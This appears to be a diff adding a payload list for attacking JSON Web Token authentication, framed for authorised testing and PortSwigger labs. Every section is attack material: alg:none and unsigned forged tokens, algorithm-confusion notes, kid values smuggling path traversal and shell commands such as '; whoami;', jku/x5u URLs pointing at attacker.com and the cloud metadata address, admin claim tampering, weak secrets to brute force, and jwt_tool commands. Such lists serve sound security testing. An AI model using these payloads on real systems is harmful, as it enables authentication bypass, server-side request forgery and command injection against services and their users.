@@ -1,0 +1,94 @@
+# JWT attack payloads — PAT JSON Web Token + jwt_tool + PortSwigger auth labs
+# Use with jwt_tool, Burp JWT Editor, or manual base64 decode/edit/re-sign
+# Authorized testing only.
+
+# === alg:none variants ===
+{"alg":"none"}
+{"alg":"None"}
+{"alg":"NONE"}
+{"alg":"nOnE"}
+{"alg":"null"}
+{"alg":""}
+{"alg":"NoNe"}
+
+# === Empty / stripped signature ===
+eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWUsImlhdCI6MTUxNjIzOTAyMn0.
+eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.
+eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.
+
+# === RS256 -> HS256 confusion ===
+# Re-sign with HMAC using public key as secret after changing alg to HS256
+{"alg":"HS256","typ":"JWT"}
+
+# === kid injection (path traversal / command injection) ===
+{"kid":"../../../../dev/null"}
+{"kid":"../../../../../../dev/null"}
+{"kid":"key.pem"}
+{"kid":"/dev/null"}
+{"kid":"| ls /"}
+{"kid":"'; sleep 5; '"}
+{"kid":"\\..\\..\\..\\..\\public.key"}
+{"kid":"http://attacker.com/jwks.json"}
+{"kid":"file:///etc/passwd"}
+{"kid":"'; whoami; '"}
+
+# === jku / x5u SSRF ===
+{"jku":"https://attacker.com/jwks.json"}
+{"jku":"http://169.254.169.254/latest/meta-data/"}
+{"x5u":"https://attacker.com/cert.pem"}
+{"x5u":"http://attacker.com/evil.cer"}
+
+# === jwk embedded key injection ===
+{"jwk":{"kty":"RSA","n":"ATTACKER_CONTROLLED","e":"AQAB"}}
+
+# === Claim tampering (re-sign after edit) ===
+{"sub":"admin"}
+{"sub":"1","role":"admin"}
+{"sub":"administrator"}
+{"username":"admin"}
+{"user":"admin"}
+{"admin":true}
+{"is_admin":true}
+{"isAdmin":true}
+{"role":"admin"}
+{"role":"administrator"}
+{"roles":["admin"]}
+{"permissions":["*"]}
+{"scope":"admin"}
+{"email":"attacker@evil.com"}
+{"user_id":1}
+{"uid":1}
+{"id":1}
+
+# === exp / nbf bypass ===
+{"exp":9999999999}
+{"nbf":0}
+{"iat":0}
+# Remove exp claim entirely
+
+# === typ confusion ===
+{"typ":"JWT"}
+{"typ":"jwk"}
+{"typ":""}
+
+# === Weak secrets to brute (jwt_tool -C -d wordlist) ===
+secret
+password
+123456
+jwt_secret
+your-256-bit-secret
+changeme
+keyboard cat
+
+# === Header injection in claims ===
+{"__proto__":{"isAdmin":true}}
+{"constructor":{"prototype":{"role":"admin"}}}
+
+# === Nested JWT / JWE confusion tests ===
+# Sign outer token with attacker key while inner uses victim alg
+
+# === Common jwt_tool commands (reference) ===
+# jwt_tool TOKEN -X a
+# jwt_tool TOKEN -X k -I -pc kid -pv ../../../../dev/null
+# jwt_tool TOKEN -X s -S hs256 -p "public_key.pem"
+# jwt_tool TOKEN -C -d payloads/wordlists/common.txt
